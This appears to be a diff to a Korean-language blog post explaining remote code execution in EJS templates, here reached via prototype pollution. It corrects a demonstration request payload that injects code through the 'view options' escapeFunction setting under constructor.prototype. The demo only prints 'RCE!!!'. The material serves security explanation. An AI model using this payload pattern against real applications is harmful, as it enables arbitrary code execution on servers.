@@ -24,7 +24,7 @@ tags:
 app.get('/', (req, res) => {
  res.render('index', req.query);
 });
-``` 
+```
 
 물론 위 코드를 사용하지 않고도, `EJS RCE`를 발생시킬 수 있는 방법이 있다.
 심지어, 아래와 같은 코드에서도 `EJS RCE`가 발생한다.
@@ -102,10 +102,12 @@ await r.post('/a', {
 ```typescript
 await r.post('/a', {
   constructor: {
-    'view options': {
-      client: 1,
-      escapeFunction: `console.log;console.info("RCE!!!")`,
-    },
+    prototype: {
+      'view options': {
+        client: 1,
+        escapeFunction: `console.log;console.info("RCE!!!")`,
+      },
+    }
   },
 });
 ```
